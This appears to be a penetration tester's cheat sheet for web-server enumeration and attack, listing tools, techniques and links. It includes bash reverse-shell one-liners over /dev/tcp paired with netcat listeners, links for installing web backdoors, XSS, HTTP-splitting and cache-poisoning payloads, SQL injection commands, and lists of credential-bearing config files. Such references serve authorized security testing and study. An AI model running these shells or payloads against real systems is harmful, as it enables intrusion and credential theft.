- Browse the website
- check robot.txt
- check directories
- check sw version
- check admin panel
- banner inspection
- review source code
- bruteforce with cewl-based dictionary
- searchsploit look at versions properly
- test all the paths with the exploits, mangle it
- nmap --script vuln
- nmap --script safe (ssl-cert, virtual hosts)
- always incercept with Burp
- nikto -h
- LFI, RFI, SQL, RCE, XXE, SSRF injections
- PUT method all directories
- Change POST body encoding with Burp
- Bruteforce parameter names
- dirsearch with cookie once authenticated
- download vulnerable application from exploit-db and examine it


https://github.com/tomnomnom/httprobe

https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/

https://www.hackingarticles.in/understanding-http-protocol/

https://www.hackingarticles.in/multiple-ways-to-detect-http-options/

https://www.hackingarticles.in/understanding-http-authentication-basic-digest/

https://www.hackingarticles.in/hack-basic-http-authentication-using-burpsuite/

Web Ports 80, 8080 etc. open

    Fingerprint server
        Telnet ip_address port
        Firefox plugins
            All
                firecat
            Specific
                add n edit cookies
                asnumber
                header spy
                live http headers
                shazou
                web developer
    Crawl website
        lynx [options] startfile/URL Options include -traversal -crawl -dump -image_links -source
        httprint
        Metagoofil
            metagoofil.py -d [domain] -l [no. of] -f [type] -o results.html
    Web Directory enumeration
        Nikto
            nikto [-h target] [options]
        DirBuster
        Wikto
        Goolag Scanner
    Vulnerability Assessment
        Manual Tests
            Default Passwords
            Install Backdoors
                ASP
                    http://packetstormsecurity.org/UNIX/penetration/aspxshell.aspx.txt
                Assorted
                    http://michaeldaw.org/projects/web-backdoor-compilation/
                    http://open-labs.org/hacker_webkit02.tar.gz
                Perl
                    http://home.arcor.de/mschierlm/test/pmsh.pl
                    http://pentestmonkey.net/tools/perl-reverse-shell/
                    http://freeworld.thc.org/download.php?t=r&f=rwwwshell-2.0.pl.gz
                PHP
                    http://php.spb.ru/remview/
                    http://pentestmonkey.net/tools/php-reverse-shell/
                    http://pentestmonkey.net/tools/php-findsock-shell/
                Python
                    http://matahari.sourceforge.net/
                TCL
                    http://www.irmplc.com/download_pdf.php?src=Creating_Backdoors_in_Cisco_IOS_using_Tcl.pdf&force=yes
                Bash Connect Back Shell
                    GnuCitizen
                        Atttack Box: nc -l -p Port -vvv

                        Victim: $ exec 5<>/dev/tcp/IP_Address/Port

                        Victim: $ cat <&5 | while read line; do $line 2>&5 >&5; done
                    Neohapsis
                        Atttack Box: nc -l -p Port -vvv

                        Victim: $ exec 0</dev/tcp/IP_Address/Port # First we copy our connection over stdin

                        Victim: $ exec 1>&0 # Next we copy stdin to stdout

                        Victim: $ exec 2>&0 # And finally stdin to stderr

                        Victim: $ exec /bin/sh 0</dev/tcp/IP_Address/Port 1>&0 2>&0
            Method Testing
                nc IP_Adress Port
                    HEAD / HTTP/1.0
                    OPTIONS / HTTP/1.0
                    PROPFIND / HTTP/1.0
                    TRACE / HTTP/1.1
                    PUT http://Target_URL/FILE_NAME
                    POST http://Target_URL/FILE_NAME HTTP/1.x
            Upload Files
                curl
                    curl -u <username:password> -T file_to_upload <Target_URL>
                    curl -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" <Target_URL>
                put.pl
                    put.pl -h target -r /remote_file_name -f local_file_name
                webdav
                    cadaver
            View Page Source
                Hidden Values
                Developer Remarks
                Extraneous Code
                Passwords!
            Input Validation Checks
                NULL or null
                    Possible error messages returned.
                ' , " , ; , <!
                    Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
                – , = , + , "
                    Used to craft SQL Injection queries.
                ‘ , &, ! , ¦ , < , >
                    Used to find command execution vulnerabilities.
                "><script>alert(1)</script>
                    Basic Cross-Site Scripting Checks.
                %0d%0a
                    Carriage Return (%0d) Line Feed (%0a)
                        HTTP Splitting

                            language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
                                i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47<html>blah</html>
                        Cache Poisoning

                            language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
                %7f , %ff
                    byte-length overflows; maximum 7- and 8-bit values.
                -1, other
                    Integer and underflow vulnerabilities.
                %n , %x , %s
                    Testing for format string vulnerabilities.
                ../
                    Directory Traversal Vulnerabilities.
                % , _, *
                    Wildcard characters can sometimes present DoS issues or information disclosure.
                Ax1024+
                    Overflow vulnerabilities.
            Automated table and column iteration
                orderby.py
                    ./orderby.py www.site.com/index.php?id=
                d3sqlfuzz.py
                    ./d3sqlfuzz.py www.site.com/index.php?id=-1+UNION+ALL+SELECT+1,COLUMN,3+FROM+TABLE--
        Vulnerability Scanners
            Acunetix
            Grendelscan
            NStealth
            Obiwan III
            w3af
        Specific Applications/ Server Tools
            Domino
                dominoaudit
                    dominoaudit.pl [options] -h <IP>
            Joomla
                cms_few
                    ./cms.py <site-name>
                joomsq
                    ./joomsq.py <IP>
                joomlascan

                    ./joomlascan.py <site> <options>  [options i.e. -p/-proxy <host:port> : Add proxy support -404 : Don't show 404 responses]
                joomscan
                    ./joomscan.py -u "www.site.com/joomladir/" -o site.txt -p 127.0.0.1:80
                jscan
                    jscan.pl -f hostname
                    (shell.txt required)
            aspaudit.pl
                asp-audit.pl http://target/app/filename.aspx (options i.e. -bf)
            Vbulletin
                vbscan.py
                    vbscan.py <host> <port> -v
                    vbscan.py -update
            ZyXel
                zyxel-bf.sh
                snmpwalk
                    snmpwalk -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2
                snmpget
                    snmpget -v2c -c public IP_Address 1.3.6.1.4.1.890.1.2.1.2.6.0
    Proxy Testing
        Burpsuite
        Crowbar
        Interceptor
        Paros
        Requester Raw
        Suru
        WebScarab
    Examine configuration files
        Generic
            Examine httpd.conf/ windows config files
        JBoss
            JMX Console http://<IP>:8080/jmxconcole/
                War File
        Joomla
            configuration.php
            diagnostics.php
            joomla.inc.php
            config.inc.php
        Mambo
            configuration.php
            config.inc.php
        Wordpress
            setup-config.php
            wp-config.php
        ZyXel
            /WAN.html (contains PPPoE ISP password)
            /WLAN_General.html and /WLAN.html (contains WEP key)
            /rpDyDNS.html (contains DDNS credentials)
            /Firewall_DefPolicy.html (Firewall)
            /CF_Keyword.html (Content Filter)
            /RemMagWWW.html (Remote MGMT)
            /rpSysAdmin.html (System)
            /LAN_IP.html (LAN)
            /NAT_General.html (NAT)
            /ViewLog.html (Logs)
            /rpFWUpload.html (Tools)
            /DiagGeneral.html (Diagnostic)
            /RemMagSNMP.html (SNMP Passwords)
            /LAN_ClientList.html (Current DHCP Leases)
            Config Backups
                /RestoreCfg.html
                /BackupCfg.html
                Note: - The above config files are not human readable and the following tool is required to breakout possible admin credentials and other important settings
                    ZyXEL Config Reader
    Examine web server logs
        c:\winnt\system32\Logfiles\W3SVC1
            awk -F " " '{print $3,$11} filename | sort | uniq
    References
        White Papers
            Cross Site Request Forgery: An Introduction to a Common Web Application Weakness
            Attacking Web Service Security: Message Oriented Madness, XML Worms and Web Service Security Sanity
            Blind Security Testing - An Evolutionary Approach
            Command Injection in XML Signatures and Encryption
            Input Validation Cheat Sheet
            SQL Injection Cheat Sheet
        Books
            Hacking Exposed Web 2.0
            Hacking Exposed Web Applications
            The Web Application Hacker's Handbook
    Exploit Frameworks
        Brute-force Tools
            Acunetix
        Metasploit
        w3af 

common-http-ports

66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8080,8888,30821

Web Enumeration (80/443):

    dirbuster (GUI)
    nikto –h 10.0.0.1

HTTP response status codes

https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
https://www.tutorialspoint.com/security_testing/http_protocol_basics.htm

    Informational responses (100–199),
    Successful responses (200–299),
    Redirects (300–399),
    Client errors (400–499),
    and Server errors (500–599).

HTTP general testing / fingerprinting

  52. http://hping.org/wbox/
  53. http://htcheck.sourceforge.net/
  54. http://www.lurhq.com/tools/mumsie.html
  55. http://www.webinject.org/
  56. http://stein.cshl.org/~lstein/torture/
  57. http://www.joedog.org/JoeDog/Siege/
  58. http://www.open-labs.org/
  59. http://ge.mine.nu/lbd.html
  60. http://ujeni.murkyroc.com/hmap/
  61. http://net-square.com/httprint/
  62. http://wpoison.sourceforge.net/
  63. http://net-square.com/msnpawn/index.shtml
  64. http://druid.caughq.org/projects/hcraft/
  65. http://www.wiretrip.net/rfp/lw.asp
  66. http://www.cirt.net/code/nikto.shtml
  67. http://twill.idyll.org/
  68. http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
  69. http://security-net.biz/files/dff/DFF.zip
  70. http://packetstormsecurity.org/web/elza-1.4.7-beta.zip
  71. http://www.stoev.org/elza.html
  72. http://sf.net/projects/hackfox

Browser-based HTTP tampering / editing / replaying

  73. http://www.bayden.com/Other/
  74. http://www.infobyte.com.ar/developments.html
  75. http://modifyheaders.mozdev.org/
  76. http://tamperdata.mozdev.org/
  77. https://addons.mozilla.org/en-US/firefox/addon/1290/
  78. https://addons.mozilla.org/en-US/firefox/addon/1385/
  79. https://addons.mozilla.org/en-US/firefox/addon/1806/
  80. https://addons.mozilla.org/en-US/firefox/addon/1913/
  81. http://livehttpheaders.mozdev.org/
